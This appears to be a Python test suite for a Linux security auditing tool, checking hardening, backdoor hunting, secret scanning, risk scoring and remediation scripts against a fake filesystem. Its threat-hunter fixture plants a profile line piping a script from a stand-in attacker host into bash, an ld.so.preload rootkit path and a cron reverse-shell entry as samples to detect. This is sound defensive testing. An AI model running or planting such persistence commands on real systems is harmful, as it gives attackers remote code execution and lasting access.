"""
AI AYFAM v5 — Test Suite for V5 Intelligence Modules
اختبارات شاملة لوحدات الذكاء الجديد في V5 — تعمل 100% محلياً ودون الحاجة لاتصال بالإنترنت.
"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from engine.finding import Finding
from engine.sysreader import FakeSystem
from engine.hardening import HardeningEngine
from engine.hunter import ThreatHunter
from engine.secretscan import SecretScanner
from engine.risk import RiskEngine
from engine.attack import AttackEngine
from engine.planner import RemediationPlanner

passed = failed = 0
def check(name, cond):
    global passed, failed
    if cond:
        passed += 1; print(f"  ✅ {name}")
    else:
        failed += 1; print(f"  ❌ {name}")

print("\n[1] Finding Model & Hashing")
f1 = Finding(severity="critical", title="Test Finding", detail="detail", fix="remedy")
check("finding acts like dict", f1["severity"] == "critical" and f1.get("title") == "Test Finding")
check("deterministic id generated", len(f1["id"]) == 16)

print("\n[2] CIS Hardening Engine with FakeSystem")
fake_sys = FakeSystem(
    files={"/etc/shadow": "root:x:...", "/proc/mounts": "none /dev/shm tmpfs rw 0 0"},
    sysctls={"net.ipv4.ip_forward": "1", "fs.suid_dumpable": "1", "kernel.randomize_va_space": "0"}
)
he = HardeningEngine(sys_reader=fake_sys)
findings = he.audit_all()
titles = [f["title"] for f in findings]
check("detects insecure ip_forward", any("net.ipv4.ip_forward" in t for t in titles))
check("detects disabled ASLR", any("ASLR" in t for t in titles))
check("detects insecure /dev/shm mount", any("/dev/shm" in t for t in titles))

print("\n[4] Threat Hunter (Backdoors & Persistence)")
fake_hunter_sys = FakeSystem(
    files={
        "/etc/ld.so.preload": "/lib/evil_rootkit.so",
        "/etc/profile": "curl -s http://evil.com/x.sh | bash",
        "/etc/cron.d/malicious": "* * * * * root /tmp/reverse_shell.sh",
    }
)
hunter = ThreatHunter(sys_reader=fake_hunter_sys)
hunt_findings = hunter.hunt_all()
hunt_titles = [f["title"] for f in hunt_findings]
check("detects ld.so.preload rootkit", any("ld.so.preload" in t for t in hunt_titles))
check("detects bashrc/profile reverse shell", any("نمط باب خلفي" in t for t in hunt_titles))
check("detects cron referencing /tmp", any("Cron" in t for t in hunt_titles))

print("\n[5] Secret Scanner & Shannon Entropy")
scanner = SecretScanner(sys_reader=fake_sys)
entropy = scanner.shannon_entropy("randomSecretWithHighEntropy1234567890!@#")
check("high entropy calculated", entropy > 4.0)
masked = scanner.mask_secret("ghp_1234567890abcdefghijklmnopqrstuvwxyz")
check("secret masked properly", masked.startswith("ghp_") and masked.endswith("wxyz") and "..." in masked)

fake_secret_sys = FakeSystem(
    files={"/home/user/.env": "AWS_KEY=AKIAIOSFODNN7EXAMPLE\nGITHUB_TOKEN=ghp_1234567890abcdefghijklmnopqrstuvwxyz"}
)
sec_scanner = SecretScanner(sys_reader=fake_secret_sys)
sec_findings = sec_scanner.scan_path("/home/user/.env")
check("flags AWS and GitHub secrets", len(sec_findings) == 2)

print("\n[6] Risk Evaluation & What-If Simulation")
test_findings = [
    Finding(severity="critical", title="Crit 1", fix="sudo sysctl -w net.ipv4.ip_forward=0"),
    Finding(severity="high", title="High 1", fix="sudo chmod 640 /etc/shadow"),
    Finding(severity="medium", title="Med 1", fix="fix_med"),
]
eval_res = RiskEngine.evaluate(test_findings)
check("risk score deducted from 100", eval_res["score"] < 70)
check("grade calculated", eval_res["grade"] in ("B", "C", "D", "F"))

what_if = RiskEngine.simulate_what_if(test_findings, "sudo sysctl -w net.ipv4.ip_forward=0")
check("what-if score gains points", what_if["score_gain"] > 0)

print("\n[7] ATT&CK Engine & Chokepoint Reasoning")
att = AttackEngine()
for tf in test_findings:
    att.enrich_finding(tf)
chokepoints = att.chokepoint_analysis(test_findings)
check("chokepoints identified", len(chokepoints) > 0)
check("top chokepoint has fix_cmd", "fix_cmd" in chokepoints[0])

print("\n[8] Remediation Bash Planner")
bash_script = RemediationPlanner.generate_bash_script(test_findings)
check("script contains dry-run support", "--dry-run" in bash_script)
check("script contains set -euo pipefail", "set -euo pipefail" in bash_script)
check("script includes remediation commands", "sysctl" in bash_script)

print(f"\n{'='*50}\nTOTAL V5 TESTS: {passed} passed, {failed} failed\n{'='*50}")
